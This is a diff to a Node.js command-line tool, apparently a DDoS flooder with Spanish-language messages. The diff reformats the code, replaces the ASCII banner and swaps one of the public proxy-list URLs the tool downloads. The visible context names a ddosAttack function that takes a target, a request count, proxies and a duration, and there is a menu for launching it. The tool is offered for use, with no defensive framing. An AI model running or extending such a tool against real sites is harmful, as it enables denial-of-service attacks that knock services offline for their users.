@@ -1,18 +1,37 @@
-const http = require('http');                                     const https = require('https');
-const readline = require('readline');                             
-let axios;                                                        try {
-    axios = require('axios');                                     } catch (err) {
+const http = require('http');
+const https = require('https');
+const readline = require('readline');
+
+let axios;
+try {
+    axios = require('axios');
+} catch (err) {
     console.error('Error: axios no está instalado. Por favor, instálalo usando `npm install axios`.');
-    process.exit(1);                                              }
-                                                                  // Banner
-const banner = `                                                  ____ ___ ____ ___  _        _    ____    ____  ____   ___  ____
-|  _ \_ _/ ___/ _ \| |      / \  / ___|  |  _ \|  _ \ / _ \/ ___| | |_) | | |  | | | | |     / _ \ \___ \  | | | | | | | | | \___ \
-|  __/| | |__| |_| | |___ / ___ \ ___) | | |_| | |_| | |_| |___) ||_|  |___\____\___/|_____/_/   \_\____/  |____/|____/ \___/|____/ `;                                                                
-console.log(banner);                                              
-// Función para descargar la lista de proxies                     function downloadProxies(url, callback) {
-    https.get(url, (resp) => {                                            let data = '';
-                                                                          // A measure data in chunks
-        resp.on('data', (chunk) => {                                          data += chunk;
+    process.exit(1);
+}
+
+// Banner
+const banner = `
+  ______  _______ _______ _______ _______ _______ _______ _______
+ |   _  \\|       |       |   _   |       |       |       |   _   |
+ |  |_  ||   _   |   _   |  |_|  |   _   |   _   |   _   |  |_|  |
+ |       ||  | |  |  | |  |       |  | |  |  | |  |  | |  |       |
+ |  _    ||  |_|  |  |_|  |       |  |_|  |  |_|  |  |_|  |  _    |
+ |_| |_| |       |       |   _   |       |       |       |_| |_| |
+ |   |   |  _    |  _    |  | |  |   _   |  _    |  _    |   |   |
+ |___|   |_| |_| |_| |_| |__| |__|__| |__|_| |_| |_| |_| |___|   |
+`;
+
+console.log(banner);
+
+// Función para descargar la lista de proxies
+function downloadProxies(url, callback) {
+    https.get(url, (resp) => {
+        let data = '';
+
+        // A measure data in chunks
+        resp.on('data', (chunk) => {
+            data += chunk;
         });
 
         // The whole response has been received. Print out the result.
@@ -51,7 +70,7 @@ async function ddosAttack(target, numRequests, proxies, duration) {
 const proxyListUrls = [
     'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt',
     'https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/all/data.txt',
-    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt'
+    'https://raw.githubusercontent.com/jetkai/proxy-list/refs/heads/main/online-proxies/txt/proxies-http.txt'
 ];
 
 // Crear interfaz de línea de comandos
@@ -181,4 +200,4 @@ function handleMenuChoice(choice) {
             });
             break;
     }
-                        }
+}
